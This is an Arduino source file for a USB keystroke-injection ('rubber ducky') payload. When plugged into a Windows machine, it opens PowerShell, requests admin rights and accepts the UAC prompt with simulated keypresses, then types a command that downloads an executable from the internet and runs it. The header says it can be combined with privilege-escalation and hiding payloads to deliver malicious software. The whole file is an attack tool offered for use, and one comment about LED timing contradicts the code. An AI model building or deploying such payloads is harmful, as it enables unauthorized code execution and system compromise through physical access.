// Description: Payload designed to download an .exe off the internet and run it. Can be combined with the privilige escalation and hiding payloads to download malicious software etc.

#include <Keyboard.h> // Library to access the keyboard

void setup() {
  blink_led();
  Keyboard.begin(); // Initialise the keyboard
  delay(2000); // Delay to ensure that ducky initialises properly
  Payload();
}

// Blink the LED for 20 seconds. Green for the first 40 and red for the final 10. Gives warning for when a payload will execute and time to do re-upload etc.
void blink_led(){
  // Blink LED for the first 20 seconds
  for (int i = 0; i < 20; i++){
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
  }

}
// Helper Function which uses the keyboard library to press and release a key.
void keyboardInput(int key) {
  Keyboard.press(key);
  delay(100); // Small delay to ensure the key press is registered
  Keyboard.release(key);
}

// Helper Function to type any combination of keypresses
void typeKeyCombination(int keys[], int length) {
  for (int i = 0; i < length; i++) {
    Keyboard.press(keys[i]);
  }
  delay(100); // Small delay to ensure all key presses are registered
  for (int i = 0; i < length; i++) {
    Keyboard.release(keys[i]);
  }
}

void Payload() {

  // Common Key Combinations
  int altf4[] = {KEY_LEFT_ALT, KEY_F4}; // Close the application
  int desktop[] = {KEY_LEFT_GUI, 'd'}; // To Desktop: Windows + D
  int run[] = {KEY_LEFT_GUI, 'r'}; // Windows + R (opens run)
  int copycombo[] = {KEY_LEFT_CTRL, 'c'}; // Ctrl C to copy
  int pastecombo[] = {KEY_LEFT_CTRL, 'v'}; // Ctrl V to paste
  int screenshot[] = {KEY_LEFT_GUI, KEY_PRINT_SCREEN}; // Win + Prntscrn

  typeKeyCombination(desktop, 2); // exit to desktop
  delay(1000);
  typeKeyCombination(run, 2); // open run
  delay(1000);
  Keyboard.print("cmd"); // open the cmd
  delay(1000);
  keyboardInput(KEY_RETURN);
  delay(1000);
  
  // access the powershell
  Keyboard.print("powershell"); // access the powershell
  delay(1000);
  keyboardInput(KEY_RETURN);
  delay(1000);

  
  // elevate privileges of powershell to admin
  Keyboard.print("Start-Process powershell -Verb RunAs");
  keyboardInput(KEY_RETURN);
  delay(1000);
  keyboardInput(KEY_LEFT_ARROW);
  delay(1000);
  keyboardInput(KEY_RETURN);
  delay(2000);
  
  // Download spotify.exe
   Keyboard.print("powershell -Command \"$desktop = [Environment]::GetFolderPath('Desktop'); Invoke-WebRequest -Uri 'https://download.scdn.co/SpotifySetup.exe' -OutFile (Join-Path $desktop 'SpotifySetup.exe'); Start-Process -FilePath (Join-Path $desktop 'SpotifySetup.exe')\"");
  delay(2000);
  keyboardInput(KEY_RETURN);
  delay(1000);

  // Exit and Head back to the desktop.
  typeKeyCombination(desktop, 2); // exit to desktop
  delay(1000);

}

void loop() {
  
}